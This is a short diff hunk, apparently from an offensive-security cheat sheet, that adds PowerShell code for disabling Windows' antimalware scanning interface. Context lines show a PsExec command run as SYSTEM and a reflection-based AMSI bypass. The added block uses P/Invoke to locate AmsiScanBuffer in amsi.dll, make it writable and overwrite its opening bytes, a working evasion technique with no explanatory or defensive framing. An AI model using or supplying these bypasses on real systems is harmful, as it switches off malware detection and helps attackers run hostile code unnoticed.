@@ -142,3 +142,27 @@ PsExec.exe" -accepteula -s %COMSPEC% /c whoami
 $a = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
 $b = 'GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
 Invoke-Expression "$a::$b"
+
+--------
+
+$winFunc = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+'@
+
+Add-Type $winFunc
+
+$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+[Win32]::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]0)
+[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x31,0xFF,0x90,0x90,0x90), 0, $ptr, 5)
